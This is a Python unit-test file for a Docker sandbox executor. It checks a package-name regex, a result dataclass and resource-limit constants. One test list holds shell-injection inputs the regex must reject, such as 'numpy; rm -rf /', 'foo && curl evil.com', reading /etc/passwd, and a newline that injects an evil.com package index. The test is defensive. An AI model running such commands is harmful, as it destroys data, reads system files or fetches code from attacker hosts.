"""
tests/unit/test_docker_executor_pure.py
=========================================
Unit tests for the pure-Python logic inside docker_executor.py.

Important: These tests do NOT require a running Docker daemon.
They test only the parts of DockerExecutor that are independently testable:
  - _SAFE_PACKAGE_RE package name regex
  - ExecutionResult dataclass field access
  - Timeout and memory constant values

The tests that actually spin up Docker containers live in
tests/system/test_docker_sandbox.py (marked @pytest.mark.system).

We test the regex by accessing it directly from the module rather than
going through DockerExecutor.__init__ (which calls _verify_docker and
would fail without Docker).
"""

import re
import pytest


# ── Access the compiled regex directly from the module ────────────────────────

@pytest.fixture(scope="module")
def safe_pkg_re():
    """Return the compiled _SAFE_PACKAGE_RE from docker_executor."""
    import docker_executor
    return docker_executor._SAFE_PACKAGE_RE


@pytest.fixture(scope="module")
def execution_result_cls():
    """Return the ExecutionResult dataclass."""
    import docker_executor
    return docker_executor.ExecutionResult


@pytest.fixture(scope="module")
def executor_cls():
    """Return the DockerExecutor class (not instantiated)."""
    import docker_executor
    return docker_executor.DockerExecutor


# ═══════════════════════════════════════════════════════════════════════════════
# _SAFE_PACKAGE_RE — valid package specs
# ═══════════════════════════════════════════════════════════════════════════════

@pytest.mark.unit
class TestSafePackageRegexValid:
    """
    Every entry in this list represents a legitimate pip package spec
    that the regex must accept (fullmatch returns a match object, not None).
    """

    @pytest.mark.parametrize("spec", [
        # plain names
        "numpy",
        "pandas",
        "requests",
        "scikit-learn",
        "Pillow",
        "PyYAML",
        # version equality
        "numpy==1.24.0",
        "pandas==2.0.3",
        # version ranges (single constraint only — the regex does not support
        # comma-separated multi-constraints like numpy>=1.21,<2.0)
        "requests>=2.28.0",
        # extras
        "requests[security]",
        "requests[security]==2.31.0",
        # tilde-equal (compatible release)
        "numpy~=1.21.0",
        # underscores (normalised to hyphens by pip, but regex should accept)
        "some_package",
        "some_package==1.0",
        # dots in name
        "zope.interface",
        "zope.interface>=5.0",
        # single character name
        "a",
    ])
    def test_valid_spec_is_accepted(self, safe_pkg_re, spec):
        assert safe_pkg_re.match(spec) is not None, (
            f"Expected '{spec}' to be accepted by _SAFE_PACKAGE_RE"
        )

    @pytest.mark.parametrize("spec", [
        "numpy>=1.21,<2.0",
        "pandas>=1.0.0,<3.0.0",
    ])
    def test_known_regex_limitation_comma_version(self, safe_pkg_re, spec):
        """
        KNOWN LIMITATION: _SAFE_PACKAGE_RE does not support comma-separated
        version constraints (e.g. numpy>=1.21,<2.0). These are valid pip specs
        but the current regex rejects them.

        This test documents the gap so it is visible during code review.
        The fix would be to extend the regex to allow multiple comma-separated
        version specifiers. This is a low-risk limitation because the sandbox
        install step uses sanitized_packages and rejecting a valid spec causes
        a PackageInstallError, not a security bypass.
        """
        # Currently rejected — document this as a known gap
        assert safe_pkg_re.match(spec) is None, (
            f"Regex now accepts '{spec}' — update this test and the "
            f"known-limitation documentation if the regex was intentionally fixed."
        )


# ═══════════════════════════════════════════════════════════════════════════════
# _SAFE_PACKAGE_RE — dangerous / invalid package specs
# ═══════════════════════════════════════════════════════════════════════════════

@pytest.mark.unit
class TestSafePackageRegexInvalid:
    """
    These are package specs that must be REJECTED because they could enable
    shell injection or represent invalid pip syntax.
    """

    @pytest.mark.parametrize("spec", [
        # shell injection attempts
        "numpy; rm -rf /",
        "foo && curl evil.com",
        "bar | cat /etc/passwd",
        "pkg$(whoami)",
        "`id`",
        "pkg > /tmp/out",
        # spaces
        "numpy pandas",
        "my package",
        # empty string
        "",
        # path traversal
        "../../../etc/passwd",
        "/absolute/path",
        # newlines / control chars
        "numpy\n--index-url http://evil.com",
        "pandas\x00",
    ])
    def test_dangerous_spec_is_rejected(self, safe_pkg_re, spec):
        assert safe_pkg_re.match(spec) is None, (
            f"Expected '{spec}' to be REJECTED by _SAFE_PACKAGE_RE "
            f"but it matched"
        )


# ═══════════════════════════════════════════════════════════════════════════════
# ExecutionResult dataclass
# ═══════════════════════════════════════════════════════════════════════════════

@pytest.mark.unit
class TestExecutionResult:
    """Verify ExecutionResult field names and default for optional error_type."""

    def test_all_required_fields_accessible(self, execution_result_cls):
        result = execution_result_cls(
            return_code=0,
            stdout="hello\n",
            stderr="",
            execution_time=0.42,
            timed_out=False,
        )
        assert result.return_code    == 0
        assert result.stdout         == "hello\n"
        assert result.stderr         == ""
        assert result.execution_time == 0.42
        assert result.timed_out      is False

    def test_error_type_defaults_to_none(self, execution_result_cls):
        result = execution_result_cls(
            return_code=1,
            stdout="",
            stderr="error",
            execution_time=0.1,
            timed_out=False,
        )
        assert result.error_type is None

    def test_error_type_can_be_set(self, execution_result_cls):
        result = execution_result_cls(
            return_code=-1,
            stdout="",
            stderr="timed out",
            execution_time=30.0,
            timed_out=True,
            error_type="TimeoutError",
        )
        assert result.error_type == "TimeoutError"

    def test_nonzero_return_code_is_not_success(self, execution_result_cls):
        result = execution_result_cls(
            return_code=1,
            stdout="",
            stderr="SyntaxError",
            execution_time=0.05,
            timed_out=False,
        )
        assert result.return_code != 0


# ═══════════════════════════════════════════════════════════════════════════════
# DockerExecutor class-level constants
# ═══════════════════════════════════════════════════════════════════════════════

@pytest.mark.unit
class TestDockerExecutorConstants:
    """
    Verify the security hardening constants on the DockerExecutor class.
    These are read at runtime when building docker run commands.
    Changing them accidentally would weaken sandbox isolation.
    """

    def test_memory_limit_is_512m(self, executor_cls):
        assert executor_cls.MEMORY_LIMIT == "512m"

    def test_cpu_limit_is_1(self, executor_cls):
        assert executor_cls.CPU_LIMIT == "1"

    def test_pid_limit_is_100(self, executor_cls):
        assert executor_cls.PID_LIMIT == "100"

    def test_image_name(self, executor_cls):
        assert executor_cls.IMAGE_NAME == "agent-sandbox"

    def test_default_timeout_less_than_max(self, executor_cls):
        assert executor_cls.DEFAULT_TIMEOUT < executor_cls.MAX_TIMEOUT

    def test_max_timeout_is_300(self, executor_cls):
        assert executor_cls.MAX_TIMEOUT == 300
